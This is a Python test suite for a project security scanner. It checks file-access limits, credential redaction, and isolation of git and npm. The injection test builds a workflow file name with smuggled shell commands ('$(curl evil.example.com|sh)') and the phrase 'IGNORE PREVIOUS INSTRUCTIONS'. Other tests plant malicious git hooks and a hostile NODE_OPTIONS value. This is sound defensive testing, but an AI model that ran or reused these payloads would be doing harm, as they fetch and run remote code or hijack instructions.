"""P0 acceptance tests: safe file access, no credentials in output, isolated subprocesses, explicit
uncertainty. Run with the rest: make test.

Everything here runs offline on synthetic fixture copies in a temp folder:
  - file access is proven with a Python audit hook that logs every file the scanner opens;
  - npm is a fake script on PATH (records argv/env/cwd), except one test that runs the real npm
    against a loopback fake registry with an fs-tracing hook (skipped when npm/node are missing);
  - PyPI lookups go to an unreachable local proxy, so they fail fast and must show as errors.
"""
import hashlib
import json
import os
import shutil
import stat
import subprocess
import sys
import tempfile
import time
import unittest

HERE = os.path.dirname(os.path.abspath(__file__))
REPO = os.path.dirname(HERE)
sys.path[:0] = [REPO, HERE, os.path.join(HERE, "helpers")]

import fake_registry  # noqa: E402
import fixture_setup  # noqa: E402
from occupai_scan import hygiene as hyg  # noqa: E402
from occupai_scan import tracker as trk  # noqa: E402
from occupai_scan.common import SCRIPT_VERSION, clean, defang, git  # noqa: E402
from occupai_scan.safefs import Policy, is_sensitive  # noqa: E402

DEMO_CHECKS = os.path.join(REPO, "examples", "demo", "library", "checks.json")
TRACE_CODE = ("import sys,runpy;L=open(sys.argv[1],'a',buffering=1);"
              "sys.addaudithook(lambda e,a:(e=='open' and isinstance(a[0],(str,bytes)) and L.write(str(a[0])+'\\n')) and None);"
              "sys.argv=['occupai_scan']+sys.argv[2:];runpy.run_module('occupai_scan',run_name='__main__',alter_sys=True)")
CLEAN_NPM = {"auditReportVersion": 2, "vulnerabilities": {},
             "metadata": {"vulnerabilities": {"info": 0, "low": 0, "moderate": 0, "high": 0, "critical": 0, "total": 0}}}
VULN_NPM = {"auditReportVersion": 2,
            "vulnerabilities": {"occupai-demo-anim": {"name": "occupai-demo-anim", "severity": "critical", "isDirect": True,
                                                     "via": [{"source": 1, "url": "https://github.com/advisories/GHSA-demo-0001",
                                                              "severity": "critical"}], "range": "*", "fixAvailable": False}},
            "metadata": {"vulnerabilities": {"info": 0, "low": 0, "moderate": 0, "high": 0, "critical": 1, "total": 1}}}

FAKE_NPM = r'''#!{python}
import json, os, sys
LOG = {log!r}
MODE = {mode!r}
try:
    name = json.load(open("package.json")).get("name")
except Exception:
    name = None
with open(LOG, "a") as f:
    f.write(json.dumps({{"argv": sys.argv[1:], "cwd": os.getcwd(), "env": dict(os.environ), "name": name,
                        "files": sorted(os.listdir("."))}}) + "\n")
mode = MODE
if mode.startswith("fail-for:"):
    mode = "json-error" if name == mode.split(":", 1)[1] else "clean"
if mode == "clean":
    print(json.dumps({clean}))
elif mode == "vuln":
    print(json.dumps({vuln})); sys.exit(1)
elif mode == "json-error":
    sys.stderr.write("npm ERR! 401 https://u:{secret}@registry.example.com/ token {secret}\n")
    print(json.dumps({{"error": {{"code": "E401", "summary": "auth for https://u:{secret}@registry.example.com/",
                                  "detail": "{secret}"}}}})); sys.exit(1)
elif mode == "malformed":
    print("<html>{secret}</html>"); sys.exit(1)
elif mode == "empty-fail":
    sys.stderr.write("{secret}\n"); sys.exit(1)
'''


def realtmp(prefix):
    return os.path.realpath(tempfile.mkdtemp(prefix=prefix))


def snapshot(root):
    """Every path under root (incl. .git) with type, size, mtime and content hash."""
    snap = {}
    for dp, dns, fns in os.walk(root):
        for n in dns + fns:
            p = os.path.join(dp, n)
            st = os.lstat(p)
            if stat.S_ISLNK(st.st_mode):
                snap[p] = ("link", os.readlink(p))
            elif stat.S_ISDIR(st.st_mode):
                snap[p] = ("dir",)
            else:
                try:
                    with open(p, "rb") as f:
                        h = hashlib.sha256(f.read()).hexdigest()
                except OSError:
                    h = "unreadable"
                snap[p] = ("file", st.st_size, st.st_mtime_ns, h)
    return snap


def git_fixture(cwd, *args):
    fixture_setup._git(cwd, *args)


class Env:
    """A hermetic environment: temp HOME, no config, fake npm on PATH, PyPI behind a dead proxy."""

    def __init__(self, tmp, npm_mode="clean", extra=None):
        self.tmp = tmp
        self.home = os.path.join(tmp, "home")
        os.makedirs(self.home, exist_ok=True)
        self.bin = os.path.join(tmp, f"bin-{npm_mode.replace(':', '-')}")
        self.npm_log = os.path.join(tmp, f"npm-{npm_mode.replace(':', '-')}.log")
        os.makedirs(self.bin, exist_ok=True)
        if npm_mode != "missing":
            path = os.path.join(self.bin, "npm")
            with open(path, "w") as f:
                f.write(FAKE_NPM.format(python=sys.executable, log=self.npm_log, mode=npm_mode, clean=CLEAN_NPM,
                                        vuln=VULN_NPM, secret="NPMSECRET0wQ9z"))
            os.chmod(path, 0o755)
        gitbin = shutil.which("git")
        gdir = os.path.join(tmp, "gitonly")
        os.makedirs(gdir, exist_ok=True)
        if not os.path.exists(os.path.join(gdir, "git")):
            os.symlink(gitbin, os.path.join(gdir, "git"))
        self.env = {"HOME": self.home, "OCCUPAI_CONFIG": "", "OCCUPAI_SKIP_KIT_DATA": "1", "PYTHONPATH": REPO, "PATH": f"{self.bin}:{gdir}",
                    "HTTPS_PROXY": "http://127.0.0.1:9", "https_proxy": "http://127.0.0.1:9",
                    "NO_PROXY": "", "no_proxy": "", "LANG": "C.UTF-8", **(extra or {})}

    def run(self, *args, trace=None):
        cmd = [sys.executable, "-c", TRACE_CODE, trace, *args] if trace else [sys.executable, "-m", "occupai_scan", *args]
        return subprocess.run(cmd, cwd=self.home, capture_output=True, text=True, env=self.env, timeout=300)

    def json(self, *args, trace=None):
        r = self.run(*args, trace=trace)
        if r.returncode != 0:
            raise AssertionError(f"exit {r.returncode}: {r.stdout}{r.stderr}")
        return json.loads(r.stdout)

    def npm_calls(self):
        if not os.path.exists(self.npm_log):
            return []
        with open(self.npm_log) as f:
            return [json.loads(x) for x in f if x.strip()]


def build_p0(tmp, seed=7):
    """Fixture copy plus the P0 traps: symlinks to secrets and outside the root, sensitive look-alikes,
    oversized and unreadable inputs."""
    root = os.path.join(tmp, "projects")
    outside = os.path.join(tmp, "outside")
    keys = fixture_setup.build(root, seed=seed)
    gen = fixture_setup.make_keys(seed + 1)
    os.makedirs(os.path.join(outside, "proj"))
    with open(os.path.join(outside, "secret.txt"), "w") as f:
        f.write(f"TOKEN={gen['FAKE_GITHUB_TOKEN']}\n")
    for n in ("package.json", "package-lock.json"):
        shutil.copy(os.path.join(root, "bad-deps", n), os.path.join(outside, "proj", n))
    with open(os.path.join(outside, "proj", ".env"), "w") as f:
        f.write(f"KEY={gen['FAKE_OPENAI_KEY']}\n")
    # 1) an ordinary-looking tracked source file that is a symlink to .env
    os.symlink("../.env", os.path.join(root, "web-shop", "src", "config.ts"))
    git_fixture(os.path.join(root, "web-shop"), "add", "-f", "src/config.ts")
    git_fixture(os.path.join(root, "web-shop"), "commit", "-q", "-m", "add config")
    # 2) symlinked manifests/lockfiles
    ld = os.path.join(root, "link-deps")
    os.makedirs(ld)
    with open(os.path.join(ld, "package.json"), "w") as f:
        json.dump({"name": "link-deps", "version": "1.0.0"}, f)
    os.symlink(os.path.join(outside, "proj", "package-lock.json"), os.path.join(ld, "package-lock.json"))
    os.symlink(os.path.join(outside, "secret.txt"), os.path.join(ld, "requirements.txt"))
    # 3) a top-level directory symlink that leaves the root
    os.symlink(os.path.join(outside, "proj"), os.path.join(root, "escape"))
    # 4) sensitive look-alikes stay metadata-only; approved env examples stay readable
    cp = os.path.join(root, "cred-proj")
    os.makedirs(cp)
    for n in ("credentials.example.json", "service-account.template.json", "server.key", "cert.example.pem",
              "id_rsa.example", ".env.defaults", ".env.local", "deploy.p12"):
        with open(os.path.join(cp, n), "w") as f:
            f.write(f"value={gen['FAKE_ANTHROPIC_KEY']}\n")
    for n in (".env.example", ".env.local.example"):
        with open(os.path.join(cp, n), "w") as f:
            f.write(f"ANTHROPIC_API_KEY={gen['FAKE_ANTHROPIC_KEY_2']}\n")
    # 5) oversized and unreadable inputs
    bp = os.path.join(root, "big-proj")
    os.makedirs(bp)
    with open(os.path.join(bp, "big.txt"), "w") as f:
        f.write("x" * 1_200_000)
    with open(os.path.join(bp, "locked.ts"), "w") as f:
        f.write("export const a = 1\n")
    os.chmod(os.path.join(bp, "locked.ts"), 0)
    return root, outside, keys, gen


def opened_paths(log):
    with open(log) as f:
        return {line.rstrip("\n") for line in f}


# ====================================================================== 1. safe filesystem access

class TestSafeFilesystem(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.tmp = realtmp("occupai-p0fs-")
        cls.root, cls.outside, cls.keys, cls.gen = build_p0(cls.tmp)
        cls.e = Env(cls.tmp)
        cls.storage = os.path.join(cls.tmp, "storage")
        cls.trace = os.path.join(cls.tmp, "open.log")
        st, hy, au = (os.path.join(cls.storage, n) for n in ("state.json", "hy.json", "au.json"))
        cls.outs = {}
        for name, args in [("projects", ["projects"]), ("changed", ["changed", "--state", st]),
                           ("hygiene", ["hygiene", "--all", "--state", st, "--out", hy]),
                           ("versions", ["versions", "--packages", "next,occupai-demo-anim"]),
                           ("match", ["match", "--checks", DEMO_CHECKS]),
                           ("audit", ["audit", "--state", st, "--out", au]),
                           ("save", ["save-state", "--state", st, "--hygiene", hy, "--audit", au])]:
            cls.outs[name] = cls.e.json(*args, "--root", cls.root, trace=cls.trace)
        with open(hy) as f:
            cls.hy = json.load(f)
        with open(au) as f:
            cls.au = json.load(f)
        cls.opened = opened_paths(cls.trace)

    @classmethod
    def tearDownClass(cls):
        os.chmod(os.path.join(cls.root, "big-proj", "locked.ts"), 0o644)
        shutil.rmtree(cls.tmp, ignore_errors=True)

    def forbidden(self):
        r, cp = self.root, os.path.join(self.root, "cred-proj")
        return ([os.path.join(r, "web-shop", ".env"), os.path.join(r, "web-shop", "src", "config.ts"),
                 os.path.join(r, "link-deps", "package-lock.json"), os.path.join(r, "link-deps", "requirements.txt"),
                 os.path.join(r, "forked-tool", ".npmrc")] +
                [os.path.join(cp, n) for n in ("credentials.example.json", "service-account.template.json", "server.key",
                                               "cert.example.pem", "id_rsa.example", ".env.defaults", ".env.local",
                                               "deploy.p12")])

    def test_instrumentation_works(self):
        # positive control: the hook does see project reads
        self.assertIn(os.path.join(self.root, "web-shop", "src", "lib", "ai.ts"), self.opened)
        self.assertIn(os.path.join(self.root, "cred-proj", ".env.example"), self.opened)

    def test_forbidden_files_never_opened(self):
        for p in self.forbidden():
            self.assertNotIn(p, self.opened, f"opened {os.path.relpath(p, self.tmp)}")
        for p in self.opened:
            self.assertFalse(p.startswith(self.outside + os.sep) or p == self.outside,
                             f"opened outside the root: {os.path.relpath(p, self.tmp)}")
            self.assertFalse(p.startswith(os.path.join(self.root, "escape") + os.sep))

    def test_tracked_symlink_to_env_is_reported_not_read(self):
        sec = self.hy["results"]["web-shop"]["secrets"]
        self.assertEqual(sec["status"], "incomplete")
        self.assertIn({"file": "web-shop/src/config.ts", "reason": "symlink"}, sec["skipped"])
        self.assertIn("web-shop", self.hy["incomplete"])

    def test_symlinked_manifests_never_copied(self):
        r = self.au["results"]["link-deps"]
        self.assertNotEqual(r["status"], "ok")
        reasons = {s["file"]: s["reason"] for s in r["skipped"]}
        self.assertEqual(reasons.get("link-deps/package-lock.json"), "symlink")
        self.assertEqual(reasons.get("link-deps/requirements.txt"), "symlink")
        self.assertEqual([c for c in self.e.npm_calls() if c["name"] == "link-deps"], [])
        for c in self.e.npm_calls():  # npm only ever ran in scratch, on copies
            self.assertFalse(c["cwd"].startswith(self.root))
            self.assertEqual(c["files"], ["package-lock.json", "package.json"])

    def test_top_level_symlink_is_omitted(self):
        self.assertNotIn("escape", self.outs["projects"])
        self.assertIn({"path": "escape", "reason": "symlink"}, self.outs["projects"]["_omitted"])
        self.assertIn({"path": "escape", "reason": "symlink"}, self.hy["omitted"])
        self.assertEqual(self.hy["status"], "incomplete")

    def test_resume_traversal_cannot_escape(self):
        prog = os.path.join(self.tmp, "resume.json")
        with open(prog, "w") as f:
            json.dump({"units": ["../outside/proj", "escape", "/etc", "web-shop"], "created": time.time(),
                       "root": self.root, "script_version": SCRIPT_VERSION}, f)
        log = os.path.join(self.tmp, "resume-open.log")
        out = self.e.json("hygiene", "--root", self.root, "--resume", prog, "--budget", "999", trace=log)
        self.assertNotIn("escape", out["results"])
        self.assertFalse(any(".." in u or u.startswith("/") for u in out["results"]))
        self.assertIn("web-shop", out["results"])  # rediscovered properly
        for p in opened_paths(log):
            self.assertFalse(p.startswith(self.outside), os.path.relpath(p, self.tmp))
        pol = Policy(self.root)
        for bad in ("../outside", "escape", "/etc", "a/../../x", "", "."):
            with self.assertRaises(ValueError):
                pol.unit_path(bad)

    def test_sensitive_allowlist(self):
        for n in ("credentials.example.json", "service-account.template.json", "server.key", "cert.example.pem",
                  "id_rsa.example", ".env.defaults", ".env", ".env.local", ".npmrc", "deploy.p12", "credentials.json"):
            self.assertTrue(is_sensitive(n), n)
        for n in (".env.example", ".env.sample", ".env.template", ".env.local.example", "config.ts", "README.md"):
            self.assertFalse(is_sensitive(n), n)

    def test_approved_env_examples_readable(self):
        files = {f["file"] for f in self.hy["results"]["cred-proj"]["secrets"]["findings"] if f["type"] == "key-pattern"}
        self.assertEqual(files, {".env.example", ".env.local.example"})

    def test_oversized_and_unreadable_are_incomplete(self):
        sec = self.hy["results"]["big-proj"]["secrets"]
        self.assertEqual(sec["status"], "incomplete")
        reasons = {s["file"]: s["reason"] for s in sec["skipped"]}
        self.assertEqual(reasons["big-proj/big.txt"], "too-large")
        if os.geteuid() != 0:
            self.assertEqual(reasons["big-proj/locked.ts"], "unreadable")

    def test_outputs_carry_no_secret_values(self):
        blob = json.dumps(self.outs) + json.dumps(self.hy) + json.dumps(self.au)
        for v in list(self.keys.values()) + list(self.gen.values()):
            self.assertNotIn(v[-16:], blob)


class TestDestinations(unittest.TestCase):
    def setUp(self):
        self.tmp = realtmp("occupai-p0dest-")
        self.root = os.path.join(self.tmp, "projects")
        fixture_setup.build(self.root, seed=3)
        self.e = Env(self.tmp)

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_state_resume_out_inside_project_rejected(self):
        before = snapshot(self.root)
        inside = os.path.join(self.root, "web-shop", "occupai-state.json")
        cases = [["save-state", "--state", inside],
                 ["hygiene", "--resume", inside],
                 ["hygiene", "--out", inside],
                 ["hygiene", "--state", os.path.join(self.root, "clean-app", "package.json")],
                 ["tracker", "list", "--tracker", os.path.join(self.root, "web-shop", "README.md")]]
        for args in cases:
            r = self.e.run(*args, "--root", self.root)
            self.assertEqual(r.returncode, 2, args)
            self.assertIn("refusing", r.stdout, args)
        self.assertFalse(os.path.exists(inside))
        self.assertEqual(snapshot(self.root), before)

    def test_symlinked_destination_rejected(self):
        target = os.path.join(self.root, "web-shop", "package.json")
        link = os.path.join(self.tmp, "state-link.json")
        os.symlink(target, link)
        before = snapshot(self.root)
        r = self.e.run("save-state", "--root", self.root, "--state", link)
        self.assertEqual(r.returncode, 2)
        self.assertEqual(snapshot(self.root), before)

    def test_excluded_storage_inside_root_allowed(self):
        os.makedirs(os.path.join(self.root, "my-storage"))
        st = os.path.join(self.root, "my-storage", "state.json")
        out = self.e.json("save-state", "--root", self.root, "--exclude", "my-storage", "--state", st)
        self.assertEqual(out["saved"], st)
        units = self.e.json("projects", "--root", self.root, "--exclude", "my-storage")
        self.assertNotIn("my-storage", units)


# ====================================================================== 2. no credentials in output

class TestNoCredentialsInOutput(unittest.TestCase):
    SECRETS = ("URLSECRETq8", "QUERYSECRETz3", "FRAGSECRETk1", "REQSECRETa9", "VCSSECRETb7", "GITSECRETc5",
               "NPMSECRET0wQ9z", "EXCSECRETd4")

    @classmethod
    def setUpClass(cls):
        cls.tmp = realtmp("occupai-p0cred-")
        cls.root = os.path.join(cls.tmp, "projects")
        cls.keys = fixture_setup.build(cls.root, seed=11)
        al = os.path.join(cls.root, "agent-lab")
        os.makedirs(os.path.join(al, ".cursor"))
        with open(os.path.join(al, ".cursor", "mcp.json"), "w") as f:
            json.dump({"mcpServers": {"remote": {"url": "https://user:URLSECRETq8@mcp.example.net:8443/sse?"
                                                        "token=QUERYSECRETz3#FRAGSECRETk1"},
                                      "bad": {"url": "https://bad_host`x`/x"}}}, f)
        with open(os.path.join(cls.root, "py-api", "requirements.txt"), "a") as f:
            f.write("--index-url https://u:REQSECRETa9@pypi.example.org/simple\n"
                    "private-lib @ git+https://tok:VCSSECRETb7@git.example.org/x/y.git\n")
        git_fixture(os.path.join(cls.root, "forked-tool"), "remote", "set-url", "origin",
                    "https://x-access-token:GITSECRETc5@github.com/someone-else/forked-tool.git")
        cls.e = Env(cls.tmp, npm_mode="json-error")
        cls.storage = os.path.join(cls.tmp, "storage")
        st = os.path.join(cls.storage, "state.json")
        prog = os.path.join(cls.storage, "audit-progress.json")
        cls.runs = []
        for args in (["projects"], ["changed", "--state", st],
                     ["hygiene", "--state", st, "--out", os.path.join(cls.storage, "hy.json")],
                     ["audit", "--state", st, "--resume", prog, "--out", os.path.join(cls.storage, "au.json")],
                     ["save-state", "--state", st, "--hygiene", os.path.join(cls.storage, "hy.json"),
                      "--audit", os.path.join(cls.storage, "au.json")],
                     ["match", "--checks", DEMO_CHECKS], ["versions", "--packages", "next"]):
            r = cls.e.run(*args, "--root", cls.root)
            assert r.returncode == 0, r.stdout + r.stderr
            cls.runs.append(r.stdout + r.stderr)
        with open(os.path.join(cls.storage, "hy.json")) as f:
            cls.hy = json.load(f)
        with open(os.path.join(cls.storage, "au.json")) as f:
            cls.au = json.load(f)

    @classmethod
    def tearDownClass(cls):
        shutil.rmtree(cls.tmp, ignore_errors=True)

    def everything(self):
        blob = list(self.runs)
        for dp, _, fns in os.walk(self.storage):
            for fn in fns:
                with open(os.path.join(dp, fn), errors="replace") as f:
                    blob.append(f.read())
        return "\n".join(blob)

    def test_no_credentials_anywhere(self):
        blob = self.everything()
        for s in self.SECRETS:
            self.assertNotIn(s, blob)
        for v in self.keys.values():
            self.assertNotIn(v[-16:], blob)

    def test_mcp_hosts_only(self):
        hosts = {f["host"] for f in self.hy["results"]["agent-lab"]["ai"]["findings"] if f["type"] == "mcp-remote-url"}
        self.assertEqual(hosts, {"mcp.example.net", "invalid-host"})

    def test_requirements_reported_by_location(self):
        py = self.au["results"]["py-api"]["pypi"]["py-api/requirements.txt"]
        self.assertEqual(py["unsupported"], [{"line": 2, "reason": "unpinned"}, {"line": 3, "reason": "custom-index"},
                                             {"line": 4, "reason": "url-or-vcs"}])
        self.assertEqual(py["failed"], {"requests==2.32.4": "network"})  # dead proxy: an error, not clean
        self.assertNotEqual(py["status"], "ok")

    def test_subprocess_errors_are_categories(self):
        res = self.au["results"]["bad-deps"]["npm"]["bad-deps/package-lock.json"]
        self.assertEqual(res, {"status": "error", "error": "npm-error:E401"})

    def test_origin_owner_without_token(self):
        self.assertEqual(self.hy["results"]["forked-tool"]["secrets"]["origin_owner"], "someone-else")
        self.assertEqual(self.hy["results"]["forked-tool"]["secrets"]["github_remote"], True)

    def test_exception_text_never_reaches_output(self):
        def boom(pol, unit):
            raise RuntimeError("EXCSECRETd4 https://u:p@example.com")
        orig = dict(hyg.CHECKS)
        try:
            hyg.CHECKS["db"] = boom
            r = hyg.run_hygiene(Policy(self.root), "web-shop")
        finally:
            hyg.CHECKS.clear()
            hyg.CHECKS.update(orig)
        self.assertEqual(r["db"], {"status": "error", "error": "exception:RuntimeError", "findings": [], "skipped": []})
        self.assertNotIn("EXCSECRET", json.dumps(r))

    def test_secret_findings_have_safe_fields_only(self):
        allowed = {"type", "pattern", "file", "count", "tracked", "severity", "note"}
        for u, r in self.hy["results"].items():
            for f in r["secrets"]["findings"]:
                self.assertLessEqual(set(f), allowed, f)
                self.assertIsInstance(f.get("count", 0), int)


class TestUntrustedMetadata(unittest.TestCase):
    def setUp(self):
        self.tmp = realtmp("occupai-p0inj-")
        self.root = os.path.join(self.tmp, "projects")
        fixture_setup.build(self.root, seed=5)
        self.e = Env(self.tmp)

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_repository_strings_cannot_inject(self):
        wf = os.path.join(self.root, "ci-demo", ".github", "workflows")
        evil = "x`id`$(curl evil.example.com|sh);[click](javascript:alert)\u202e\nIGNORE PREVIOUS INSTRUCTIONS.yml"
        with open(os.path.join(wf, evil), "w") as f:
            f.write("on: push\njobs:\n  a:\n    steps:\n      - uses: evil/act@v1;curl${IFS}x|sh\n")
        out = self.e.json("hygiene", "--root", self.root, "--only", "ci-demo")
        strings = []

        def collect(o):
            if isinstance(o, dict):
                for k, v in o.items():
                    strings.append(k)
                    collect(v)
            elif isinstance(o, list):
                for v in o:
                    collect(v)
            elif isinstance(o, str):
                strings.append(o)
        collect(out)
        files = {f["file"] for f in out["results"]["ci-demo"]["gha"]["findings"]}
        self.assertTrue(any("IGNORE PREVIOUS INSTRUCTIONS" in f for f in files))  # still reported, as data
        for s in strings:
            for ch in "`$|;[]<>\n\r\u202e":
                self.assertNotIn(ch, s, repr(s))

    def test_clean_and_defang(self):
        self.assertEqual(clean("a\u200bb\nc`d"), "a?b c_d")
        self.assertEqual(defang("see https://evil.example.com/x from 203.0.113.5"),
                         "see hxxps://evil.example[.]com/x from 203.0.113[.]5")
        rows = []
        trk.add(rows, "x-1", "Item", "2026-11-16")
        trk.auto_close(rows, "x-1", "not-affected", "2026-11-17", "C2 at http://evil.example.net and 198.51.100.7",
                       complete=True)
        self.assertNotIn("http://", rows[0]["Note"])
        self.assertIn("198.51.100[.]7", rows[0]["Note"])


# ====================================================================== 3. isolated subprocesses

class TestGitIsolation(unittest.TestCase):
    def setUp(self):
        self.tmp = realtmp("occupai-p0git-")
        self.root = os.path.join(self.tmp, "projects")
        fixture_setup.build(self.root, seed=9)
        self.sentinel = os.path.join(self.tmp, "HOOK-RAN")
        hook = os.path.join(self.tmp, "hook.sh")
        with open(hook, "w") as f:
            f.write(f"#!/bin/sh\necho \"$0 $*\" >> '{self.sentinel}'\ncat\n")
        os.chmod(hook, 0o755)
        ws = os.path.join(self.root, "web-shop")
        readme = os.path.join(ws, "NOTES.md")
        with open(readme, "w") as f:
            f.write("aa\n")
        with open(os.path.join(ws, ".gitattributes"), "w") as f:
            f.write("*.md filter=evil diff=evil\n")
        git_fixture(ws, "add", ".gitattributes", "NOTES.md")
        git_fixture(ws, "commit", "-q", "-m", "attrs")
        # now the repository-controlled commands (configured after the fixture commits)
        for k, v in (("core.fsmonitor", hook), ("filter.evil.clean", hook), ("filter.evil.smudge", hook),
                     ("filter.evil.process", hook), ("diff.evil.textconv", hook), ("core.pager", hook),
                     ("core.hooksPath", self.tmp)):
            subprocess.run(["git", "config", k, v], cwd=ws, check=True, env={**os.environ, "GIT_CONFIG_GLOBAL": os.devnull})
        for name in ("post-checkout", "post-index-change", "reference-transaction"):
            shutil.copy(hook, os.path.join(self.tmp, name))
        # a dirty, racily-clean tracked file: plain git would re-hash it through the clean filter
        with open(readme, "w") as f:
            f.write("bb\n")
        idx = os.path.join(ws, ".git", "index")
        st = os.stat(idx)
        os.utime(readme, ns=(st.st_atime_ns, st.st_mtime_ns))
        self.e = Env(self.tmp)

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_hooks_never_run_and_nothing_changes(self):
        before = snapshot(self.root)
        st = os.path.join(self.tmp, "storage", "state.json")
        hy = os.path.join(self.tmp, "storage", "hy.json")
        au = os.path.join(self.tmp, "storage", "au.json")
        for args in (["projects"], ["changed", "--state", st], ["hygiene", "--state", st, "--out", hy],
                     ["match", "--checks", DEMO_CHECKS], ["versions", "--packages", "next"],
                     ["audit", "--state", st, "--out", au], ["save-state", "--state", st, "--hygiene", hy, "--audit", au],
                     ["hygiene", "--state", st, "--all"]):
            self.e.json(*args, "--root", self.root)
        self.assertFalse(os.path.exists(self.sentinel), "a repository-configured command ran")
        after = snapshot(self.root)
        self.assertEqual(after, before, "scan changed project files or git metadata")
        # control: plain git in the same repo does run the planted command, so the trap was live
        subprocess.run(["git", "status", "--porcelain"], cwd=os.path.join(self.root, "web-shop"), capture_output=True,
                       stdin=subprocess.DEVNULL, timeout=30, env={**os.environ, "GIT_CONFIG_GLOBAL": os.devnull})
        self.assertTrue(os.path.exists(self.sentinel), "control failed: the planted hook never runs")

    def test_git_env_is_narrow(self):
        r = git(os.path.join(self.root, "web-shop"), "config", "--get-all", "safe.directory")
        self.assertEqual(r[1].strip(), os.path.join(self.root, "web-shop"))


class TestNpmIsolationFake(unittest.TestCase):
    """npm runs in scratch with a controlled environment (fake npm records what it was given)."""

    def test_npm_environment_and_arguments(self):
        tmp = realtmp("occupai-p0npm-")
        try:
            root = os.path.join(tmp, "projects")
            fixture_setup.build(root, seed=13)
            e = Env(tmp, extra={"NODE_OPTIONS": "--require=/nonexistent/evil.js", "NPM_TOKEN": "HOSTTOKENx1",
                                "npm_config_registry": "https://sentinel.example.invalid/",
                                "NPM_CONFIG_USERCONFIG": os.path.join(tmp, "home", ".npmrc"),
                                "npm_config_globalconfig": os.path.join(tmp, "home", "global-npmrc"),
                                "GITHUB_TOKEN": "HOSTTOKENx2"})
            e.json("audit", "--root", root, "--only", "bad-deps,web-shop")
            calls = e.npm_calls()
            self.assertEqual(len(calls), 2)
            for c in calls:
                self.assertIn("--ignore-scripts", c["argv"])
                self.assertIn("--package-lock-only", c["argv"])
                self.assertNotIn("install", c["argv"])
                self.assertNotIn("ci", c["argv"])
                env = c["env"]
                scratch = os.path.realpath(os.path.dirname(c["cwd"]))
                self.assertTrue(os.path.basename(scratch).startswith("occupai-audit-"))
                self.assertFalse(os.path.exists(scratch), "scratch dir not removed")
                for k in ("NODE_OPTIONS", "NPM_TOKEN", "GITHUB_TOKEN", "NPM_CONFIG_USERCONFIG"):
                    self.assertNotIn(k, env)
                self.assertEqual(env["npm_config_registry"], "https://registry.npmjs.org/")
                self.assertIn("--registry", c["argv"])
                self.assertEqual(c["argv"][c["argv"].index("--registry") + 1], "https://registry.npmjs.org/")
                for k in ("npm_config_userconfig", "npm_config_globalconfig", "npm_config_cache", "npm_config_logs_dir",
                          "HOME", "TMPDIR"):
                    self.assertTrue(os.path.realpath(env[k]).startswith(scratch + os.sep), k)
                self.assertEqual(env["npm_config_ignore_scripts"], "true")
        finally:
            shutil.rmtree(tmp, ignore_errors=True)


@unittest.skipUnless(shutil.which("npm") and shutil.which("node"), "real npm/node not installed")
class TestRealNpmIsolation(unittest.TestCase):
    """The real npm, against a loopback fake registry, traced with an fs hook. Offline."""

    def test_real_npm(self):
        tmp = realtmp("occupai-p0realnpm-")
        good = sentinel = None
        try:
            good, good_url, good_seen = fake_registry.start(
                {"occupai-demo-anim": [{"id": 1, "url": "https://github.com/advisories/GHSA-demo-0001", "title": "demo",
                                       "severity": "critical", "vulnerable_versions": "<9.9.9", "cwe": [],
                                       "cvss": {"score": 9.8, "vectorString": None}}]})
            sentinel, sentinel_url, sentinel_seen = fake_registry.start()
            root = os.path.join(tmp, "projects")
            proj = os.path.join(root, "life")
            os.makedirs(proj)
            shutil.copy(os.path.join(HERE, "fixtures", "bad-deps", "package-lock.json"), proj)
            ran = os.path.join(tmp, "LIFECYCLE-RAN")
            pkg = {"name": "bad-deps", "version": "1.0.0", "private": True,
                   "dependencies": {"occupai-demo-anim": "1.0.2"},
                   "scripts": {s: f"touch {ran}-{s}" for s in ("preinstall", "install", "postinstall", "prepare",
                                                                "preaudit", "audit", "postaudit", "prepack")}}
            with open(os.path.join(proj, "package.json"), "w") as f:
                json.dump(pkg, f)
            home = os.path.join(tmp, "home")
            os.makedirs(home)
            host_rc = {p: os.path.join(tmp, n) for p, n in (("user", "host-user-npmrc"), ("global", "host-global-npmrc"))}
            host_rc["home"] = os.path.join(home, ".npmrc")
            for p in host_rc.values():
                with open(p, "w") as f:
                    f.write(f"registry={sentinel_url}\n//127.0.0.1/:_authToken=NPMRCSECRETy7\n"
                            f"cache={os.path.join(tmp, 'host-cache')}\n")
            trace = os.path.join(tmp, "npm-trace.log")
            bindir = os.path.join(tmp, "npmbin")
            os.makedirs(bindir)
            npm_cli = os.path.realpath(shutil.which("npm"))
            if npm_cli.endswith(".js"):
                launch = f"exec \"{shutil.which('node')}\" --require \"{os.path.join(HERE, 'helpers', 'npm_fs_trace.js')}\" " \
                         f"\"{npm_cli}\" \"$@\" --occupai-trace={trace}"
            else:
                self.skipTest("npm entry point is not a JS file")
            with open(os.path.join(bindir, "npm"), "w") as f:
                f.write(f"#!/bin/sh\n{launch}\n")
            os.chmod(os.path.join(bindir, "npm"), 0o755)
            storage = os.path.join(tmp, "storage")
            cfg = os.path.join(tmp, "occupai.config.yaml")
            with open(cfg, "w") as f:
                f.write(f"projects_root: {root}\nstorage:\n  path: {storage}\naudit:\n  npm_registry: {good_url}\n")
            env = {"HOME": home, "OCCUPAI_CONFIG": "", "OCCUPAI_SKIP_KIT_DATA": "1", "PYTHONPATH": REPO,
                   "PATH": f"{bindir}:{os.path.dirname(shutil.which('node'))}:/usr/bin:/bin",
                   "NPM_CONFIG_USERCONFIG": host_rc["user"], "npm_config_globalconfig": host_rc["global"],
                   "npm_config_registry": sentinel_url, "NODE_OPTIONS": "--require=/nonexistent/evil.js",
                   "NO_PROXY": "127.0.0.1,localhost", "no_proxy": "127.0.0.1,localhost"}
            before = snapshot(root)
            r = subprocess.run([sys.executable, "-m", "occupai_scan", "audit", "--config", cfg,
                                "--out", os.path.join(storage, "au.json")],
                               cwd=home, capture_output=True, text=True, env=env, timeout=180)
            self.assertEqual(r.returncode, 0, r.stdout + r.stderr)
            with open(os.path.join(storage, "au.json")) as f:
                au = json.load(f)
            res = au["results"]["life"]["npm"]["life/package-lock.json"]
            self.assertEqual(res["status"], "ok", res)
            self.assertEqual(res["vulns"]["occupai-demo-anim"]["advisories"], ["GHSA-demo-0001"])
            # the configured registry was used, the host-configured one never, and no credentials were sent
            self.assertTrue(any("/advisories/bulk" in s["path"] for s in good_seen))
            self.assertEqual(sentinel_seen, [])
            self.assertTrue(all(s["auth"] is None for s in good_seen))
